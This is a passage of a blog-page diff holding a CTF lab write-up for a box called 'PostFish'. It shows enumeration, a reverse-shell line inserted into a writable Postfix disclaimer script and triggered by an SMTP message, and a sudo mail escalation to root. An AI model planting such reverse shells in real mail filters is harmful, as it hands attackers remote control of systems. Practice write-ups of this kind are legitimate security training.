+</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
+</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System information as of Mon <span class="m">16</span> Oct <span class="m">2023</span> 12:26:48 AM UTC
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:  0.0               Processes:               <span class="m">212</span>
+</span></span><span class="line"><span class="cl">  Usage of /:   52.5% of 9.78GB   Users logged in:         <span class="m">0</span>
+</span></span><span class="line"><span class="cl">  Memory usage: 25%               IPv4 address <span class="k">for</span> ens160: 192.168.250.137
+</span></span><span class="line"><span class="cl">  Swap usage:   0%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">0</span> updates can be installed immediately.
+</span></span><span class="line"><span class="cl"><span class="m">0</span> of these updates are security updates.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The list of available updates is more than a week old.
+</span></span><span class="line"><span class="cl">To check <span class="k">for</span> new updates run: sudo apt update
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The programs included with the Ubuntu system are free software<span class="p">;</span>
+</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
+</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span></span><span class="line"><span class="cl">applicable law.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">You have mail.
+</span></span><span class="line"><span class="cl">brian.moore@postfish:~$
+</span></span></code></pre></div><h1 id="shell-enumeration">Shell Enumeration</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">brian.moore@postfish:/tmp$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>brian.moore<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>brian.moore<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>brian.moore<span class="o">)</span>,8<span class="o">(</span>mail<span class="o">)</span>,997<span class="o">(</span>filter<span class="o">)</span>
+</span></span><span class="line"><span class="cl">brian.moore@postfish:/tmp$ ls -la /etc/postfix/disclaimer 
+</span></span><span class="line"><span class="cl">-rwxrwx--- <span class="m">1</span> root filter <span class="m">1184</span> Oct <span class="m">16</span> 00:39 /etc/postfix/disclaimer
+</span></span></code></pre></div><p>Interesting file in etc folder, shared with root, filter group</p>
+<h1 id="change-the-config-for-postfix">Change the config for postfix</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">brian.moore@postfish:/etc/postfix$ cat disclaimer
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sh -i &gt;<span class="p">&amp;</span> /dev/tcp/192.168.45.198/1234 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Localize these.</span>
+</span></span><span class="line"><span class="cl"><span class="nv">INSPECT_DIR</span><span class="o">=</span>/var/spool/filter
+</span></span><span class="line"><span class="cl"><span class="nv">SENDMAIL</span><span class="o">=</span>/usr/sbin/sendmail
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">####### Changed From Original Script #######</span>
+</span></span><span class="line"><span class="cl"><span class="nv">DISCLAIMER_ADDRESSES</span><span class="o">=</span>/etc/postfix/disclaimer_addresses
+</span></span><span class="line"><span class="cl"><span class="c1">####### Changed From Original Script END #######</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Exit codes from &lt;sysexits.h&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">EX_TEMPFAIL</span><span class="o">=</span><span class="m">75</span>
+</span></span><span class="line"><span class="cl"><span class="nv">EX_UNAVAILABLE</span><span class="o">=</span><span class="m">69</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Clean up when done or when aborting.</span>
+</span></span><span class="line"><span class="cl"><span class="nb">trap</span> <span class="s2">&#34;rm -f in.</span><span class="nv">$$</span><span class="s2">&#34;</span> <span class="m">0</span> <span class="m">1</span> <span class="m">2</span> <span class="m">3</span> <span class="m">15</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Start processing.</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> <span class="nv">$INSPECT_DIR</span> <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="nv">$INSPECT_DIR</span> does not exist<span class="p">;</span> <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$EX_TEMPFAIL</span><span class="p">;</span> <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cat &gt;in.<span class="nv">$$</span> <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> Cannot save mail to file<span class="p">;</span> <span class="nb">exit</span> <span class="nv">$EX_TEMPFAIL</span><span class="p">;</span> <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">####### Changed From Original Script #######</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># obtain From address</span>
+</span></span><span class="line"><span class="cl"><span class="nv">from_address</span><span class="o">=</span><span class="sb">`</span>grep -m <span class="m">1</span> <span class="s2">&#34;From:&#34;</span> in.<span class="nv">$$</span> <span class="p">|</span> cut -d <span class="s2">&#34;&lt;&#34;</span> -f <span class="m">2</span> <span class="p">|</span> cut -d <span class="s2">&#34;&gt;&#34;</span> -f 1<span class="sb">`</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> <span class="sb">`</span>grep -wi ^<span class="si">${</span><span class="nv">from_address</span><span class="si">}</span>$ <span class="si">${</span><span class="nv">DISCLAIMER_ADDRESSES</span><span class="si">}</span><span class="sb">`</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">  /usr/bin/altermime --input<span class="o">=</span>in.<span class="nv">$$</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>                   --disclaimer<span class="o">=</span>/etc/postfix/disclaimer.txt <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>                   --disclaimer-html<span class="o">=</span>/etc/postfix/disclaimer.txt <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>                   --xheader<span class="o">=</span><span class="s2">&#34;X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm&#34;</span> <span class="o">||</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>                    <span class="o">{</span> <span class="nb">echo</span> Message content rejected<span class="p">;</span> <span class="nb">exit</span> <span class="nv">$EX_UNAVAILABLE</span><span class="p">;</span> <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl"><span class="c1">####### Changed From Original Script END #######</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$SENDMAIL</span> <span class="s2">&#34;</span><span class="nv">$@</span><span class="s2">&#34;</span> &lt;in.<span class="nv">$$</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="nv">$?</span>
+</span></span></code></pre></div><p><a href="https://www.howtoforge.com/how-to-automatically-add-a-disclaimer-to-outgoing-emails-with-altermime-postfix-on-debian-squeeze">How To Automatically Add A Disclaimer To Outgoing Emails With alterMIME (Postfix On Debian Squeeze)</a></p>
+<p>From the information above, this default script is run every time disclaimer user gets email. So I added the reverse shell in the script.</p>
+<h1 id="send-email-to-trigger-the-shell">Send email to trigger the shell</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -v 192.168.250.137 <span class="m">25</span>                                                                                             <span class="m">1</span> ⨯
+</span></span><span class="line"><span class="cl">postfish.off <span class="o">[</span>192.168.250.137<span class="o">]</span> <span class="m">25</span> <span class="o">(</span>smtp<span class="o">)</span> open
+</span></span><span class="line"><span class="cl"><span class="m">220</span> postfish.off ESMTP Postfix <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">HELO x
+</span></span><span class="line"><span class="cl"><span class="m">250</span> postfish.off
+</span></span><span class="line"><span class="cl">MAIL FROM: it@postfish.off
+</span></span><span class="line"><span class="cl"><span class="m">250</span> 2.1.0 Ok
+</span></span><span class="line"><span class="cl">RCPT TO: brian.moore@postifh.off
+</span></span><span class="line"><span class="cl"><span class="m">454</span> 4.7.1 &lt;brian.moore@postifh.off&gt;: Relay access denied
+</span></span><span class="line"><span class="cl">DATA 
+</span></span><span class="line"><span class="cl"><span class="m">554</span> 5.5.1 Error: no valid recipients
+</span></span><span class="line"><span class="cl">gimme the shell
+</span></span><span class="line"><span class="cl"><span class="m">502</span> 5.5.2 Error: <span class="nb">command</span> not recognized
+</span></span><span class="line"><span class="cl">RCPT TO: brian.moore@postfish.off       
+</span></span><span class="line"><span class="cl"><span class="m">250</span> 2.1.5 Ok
+</span></span><span class="line"><span class="cl">DATA
+</span></span><span class="line"><span class="cl"><span class="m">354</span> End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+</span></span><span class="line"><span class="cl">gimme the shell
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl"><span class="m">250</span> 2.0.0 Ok: queued as A51EC458F8
+</span></span></code></pre></div><h1 id="the-other-user-shell">The other user shell</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>/opt/generic<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvnp <span class="m">4444</span>                                                                                                        <span class="m">1</span> ⨯
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.45.198<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.250.137<span class="o">]</span> <span class="m">41194</span>
+</span></span><span class="line"><span class="cl">sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+</span></span><span class="line"><span class="cl">$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> filter on postfish:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User filter may run the following commands on postfish:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/mail *
+</span></span></code></pre></div><p>[mail</p>
+<pre><code>        |
+        
+        GTFOBins](https://gtfobins.github.io/gtfobins/mail/)
+</code></pre>
+<p>This user has some sudo privilege command. This can be exploit.</p>
+<h1 id="root-shell">Root shell</h1>
+<p><img src="PostFish%2040044fed3fa9498fb14f157dadde44d1/Screenshot_2023-10-16_at_04.03.50.png" alt="Screenshot 2023-10-16 at 04.03.50.png"></p>
+<h1 id="summary">Summary</h1>
+<p>Participating in this CTF was a formidable challenge, as it required the creativity to formulate a phishing strategy. I am not sure if its practical for OSCP prep but at least I learned how to enumerate email protocol, I guess.</p>
+<p>Anyway, happy hacking!</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/kei5uke" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 kei5uke.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank"  rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
